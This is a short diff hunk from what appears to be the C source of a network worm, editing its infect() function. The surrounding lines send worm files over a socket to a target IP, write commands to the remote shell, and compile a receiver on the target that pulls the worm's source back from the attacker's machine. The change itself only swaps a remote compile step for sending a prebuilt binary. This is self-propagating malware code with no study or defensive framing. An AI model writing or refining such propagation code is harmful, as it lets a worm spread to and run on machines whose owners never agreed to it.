@@ -208,15 +208,15 @@ void infect(char *ip, char *my_ip) {
 			"send_file_over_socket",
 			"worm.c",
 			"worm.h",
-            "send_file_over_socket.c",
+            // "send_file_over_socket.c" try just sending binary for now, could add compile step later
 			NULL
 		};
 		execv("./send_file_over_socket", argv);
 		exit(1);  /* If execv fails */
 	}
 
-    //compile send_file_over_socket on target for next propogation
-	write_to_sock(sock, "cc /tmp/send_file_over_socket.c -o /tmp/send_file_over_socket\n");
+    //compile send_file_over_socket on target for next propogation (dont need, just send binary)
+	// write_to_sock(sock, "cc /tmp/send_file_over_socket.c -o /tmp/send_file_over_socket\n");
 
     // Compile and run receive_file, should pull in worm.c, worm.h, and send_file_over_socket.c from attacker
 	printf("[*] Compiling receive_file.c on target...\n");
